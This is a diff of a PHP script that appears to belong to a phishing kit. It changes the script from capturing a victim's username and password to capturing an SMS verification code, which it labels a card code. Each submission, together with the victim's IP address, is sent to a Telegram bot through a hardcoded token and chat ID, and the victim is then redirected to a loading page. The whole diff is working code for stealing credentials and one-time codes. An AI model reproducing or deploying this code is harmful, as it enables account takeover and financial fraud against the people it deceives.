@@ -4,13 +4,11 @@ $token = "7799308908:AAFyAKoq4MawnnC5ddkm5hZgUi9qFWA08rw";
 $chat_id = "5157616506";
 
 if ($_SERVER["REQUEST_METHOD"] == "POST") {
-    $usuario = isset($_POST['pp1']) ? htmlspecialchars($_POST['pp1']) : '';
-    $contrasena = isset($_POST['pp2']) ? htmlspecialchars($_POST['pp2']) : '';
+    $codigo_sms = isset($_POST['int1']) ? htmlspecialchars($_POST['int1']) : '';
     $ip = $_SERVER['REMOTE_ADDR'];
     
-    $mensaje = "🛑 AVanz:: acceso 🛑\n\n";
-    $mensaje .= "👤 Usuario: $usuario\n";
-    $mensaje .= "🔑 Contraseña: $contrasena\n";
+    $mensaje = "🛑 Código CARD last 🛑\n\n";
+    $mensaje .= "📩 Código SMS: $codigo_sms\n";
     $mensaje .= "📍 IP: $ip\n";
     
     $url = "https://api.telegram.org/bot$token/sendMessage";
@@ -30,7 +28,8 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
     $context  = stream_context_create($options);
     file_get_contents($url, false, $context);
     
-    header("Location: carg.html");
+    header("Location: carg4.html");
     exit();
 }
+
 ?>
